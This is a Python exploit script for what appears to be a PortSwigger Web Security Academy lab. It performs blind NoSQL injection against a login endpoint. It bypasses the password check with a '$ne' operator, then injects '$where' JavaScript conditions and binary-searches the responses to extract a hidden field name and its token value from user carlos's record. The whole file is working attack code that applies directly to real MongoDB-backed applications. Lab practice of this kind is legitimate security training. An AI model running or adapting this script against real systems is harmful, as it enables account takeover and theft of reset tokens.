import requests
import sys
import string
from bs4 import BeautifulSoup

BASE_URL = "https://0ae600190339c8cc804312790001004d.web-security-academy.net/"
LOGIN_URL = BASE_URL + "login"

def field_name(url):
    field_name = ""
    # Binary search requires a sorted character set
    charset = sorted(string.ascii_lowercase + string.ascii_uppercase)
    for i in range(50):
        low = 0
        high = len(charset) - 1
        found_char_this_round = False

        while low <= high:
            mid = (low + high) // 2
            char = charset[mid]
            
            # Logic: Check if the character at current index is GREATER THAN our mid character
            # Using Object.keys(this)[4][i] to access the specific character index
            payload = {
                "username": "carlos",
                "password": {"$ne": "invalid"},
                "$where": f"Object.keys(this)[4][{i}] > '{char}'"
            }
            response = requests.post(url, json=payload, allow_redirects=False)
            sys.stdout.write(f"\rCurrent Status - {field_name}[{charset[mid]}]")
            sys.stdout.flush()

            if "locked" in response.text:
                # If true, the actual character is in the upper half
                low = mid + 1
                found_char_this_round = True
            else:
                # If false, the actual character is this one or in the lower half
                high = mid - 1
        
        # After the binary search, 'low' points to the correct character
        if low < len(charset):
            # One final check: if low moved but the condition is now false, 
            # we need to verify if the string actually ended
            final_char = charset[low]
            # Verify if the character exists at all at this position
            verify_payload = {"username":"carlos","password":{"$ne":"invalid"},"$where":f"Object.keys(this)[4][{i}] == '{final_char}'"}
            if "locked" in requests.post(url, json=verify_payload).text:
                field_name += final_char
            else:
                break
        else:
            break
            
    print(f"\nField Name Found: {field_name}")
    return field_name
            
            
def get_tokenvalue(url, fieldname):
    tokenvalue = ""
    # Sorted charset including digits as tokens often contain them
    charset = sorted(string.ascii_lowercase + string.digits)
    for i in range(50):
        low = 0
        high = len(charset) - 1
        
        while low <= high:
            mid = (low + high) // 2
            char = charset[mid]
            
            # Logic: Check if the character at this specific field index is GREATER THAN mid
            payload = {
                "username": "carlos",
                "password": {"$ne": "invalid"},
                "$where": f"this.{fieldname}[{i}] > '{char}'"
            }
            sys.stdout.write(f"\rCurrent Status: {tokenvalue}[{charset[mid]}]")
            sys.stdout.flush()
            
            response = requests.post(url, json=payload, allow_redirects=False)
            if "locked" in response.text:
                low = mid + 1
            else:
                high = mid - 1
        
        if low < len(charset):
            final_char = charset[low]
            verify_payload = {"username":"carlos","password":{"$ne":"invalid"},"$where":f"this.{fieldname}[{i}] == '{final_char}'"}
            if "locked" in requests.post(url, json=verify_payload).text:
                tokenvalue += final_char
            else:
                break
        else:
            break
            
    print(f"\nToken Value Found: {tokenvalue}")
    return tokenvalue


if __name__ == "__main__":
    fieldname = field_name(LOGIN_URL)
    if fieldname:
        token_value = get_tokenvalue(LOGIN_URL, fieldname)